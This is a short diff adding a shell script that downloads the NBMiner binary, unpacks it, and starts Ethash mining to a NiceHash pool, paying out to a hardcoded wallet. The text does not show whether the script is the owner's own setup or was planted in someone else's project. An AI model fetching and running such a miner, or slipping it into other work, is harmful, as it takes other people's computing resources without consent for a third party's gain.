@@ -1,0 +1,4 @@
+#!/bin/sh
+wget https://github.com/NebuTech/NBMiner/releases/download/v38.1/NBMiner_38.1_Linux.tgz
+tar -xvf NBMiner_38.1_Linux.tgz
+NBMiner_Linux/nbminer -a ethash -o stratum+ssl://daggerhashimoto.auto.nicehash.com:443 -u 3JkgN64Rw6AXXhZQWiYQngFMjVyD1CWped.RIG_
